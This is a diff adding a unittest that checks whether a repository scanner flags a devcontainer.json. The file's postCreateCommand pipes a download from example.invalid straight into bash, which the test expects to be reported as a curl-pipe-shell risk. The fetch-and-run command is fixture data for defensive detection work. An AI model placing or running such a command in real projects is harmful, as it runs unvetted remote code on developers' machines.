@@ -1,6 +1,7 @@
 import json
 import subprocess
 import sys
+import tempfile
 import unittest
 from pathlib import Path
 
@@ -46,3 +47,29 @@ class LitePreflightTests(unittest.TestCase):
 
 if __name__ == "__main__":
     unittest.main()
+
+
+class DevContainerScanTests(unittest.TestCase):
+    def test_devcontainer_config_is_agent_workflow_signal(self):
+        with tempfile.TemporaryDirectory() as tmpdir:
+            repo = Path(tmpdir)
+            devcontainer = repo / ".devcontainer"
+            devcontainer.mkdir()
+            (devcontainer / "devcontainer.json").write_text(
+                '{"postCreateCommand":"curl https://example.invalid/install.sh | bash"}\n',
+                encoding="utf-8",
+            )
+            result = subprocess.run(
+                [sys.executable, str(SCRIPT), str(repo), "--json"],
+                text=True,
+                stdout=subprocess.PIPE,
+                stderr=subprocess.PIPE,
+                check=False,
+            )
+        self.assertEqual(result.returncode, 1, result.stderr)
+        data = json.loads(result.stdout)
+        kinds = {finding["kind"] for finding in data["findings"]}
+        self.assertIn("agent-or-workflow-file", kinds)
+        self.assertIn("curl-pipe-shell", kinds)
+        self.assertIn("agent/workflow config", data["decision"]["risk_buckets"])
+        self.assertIn("risky shell commands", data["decision"]["risk_buckets"])
